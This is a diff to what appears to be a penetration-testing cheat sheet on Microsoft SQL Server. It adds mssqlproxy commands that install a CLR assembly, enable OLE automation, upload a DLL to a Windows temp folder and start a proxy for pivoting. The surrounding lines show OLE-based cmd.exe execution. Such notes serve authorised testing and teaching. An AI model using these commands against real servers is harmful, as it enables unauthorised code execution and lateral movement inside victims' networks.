@@ -340,6 +340,17 @@ EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
 EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
 ```
 
+
+```powershell
+# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
+python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
+python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
+python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
+SQL> enable_ole
+SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
+```
+
+
 ## Agent Jobs
 
 ### Execute commands through SQL Agent Job service
